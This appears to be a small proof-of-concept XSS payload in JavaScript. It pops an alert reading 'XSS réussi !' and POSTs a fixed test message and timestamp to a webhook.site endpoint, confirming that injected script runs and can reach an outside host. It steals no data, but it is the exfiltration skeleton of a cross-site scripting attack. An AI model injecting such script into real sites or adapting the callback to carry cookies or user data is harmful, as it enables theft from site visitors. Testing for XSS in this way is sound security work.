alert("XSS réussi !");

fetch('https://webhook.site/33fc25fd-1bf0-4672-8f43-c6c083183e9f', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        message: 'Test message from the XSS payload',
        timestamp: new Date().toISOString()
    })
})
.then(response => response.json())
.then(data => console.log('Data sent:', data))
.catch(error => console.error('Error:', error));
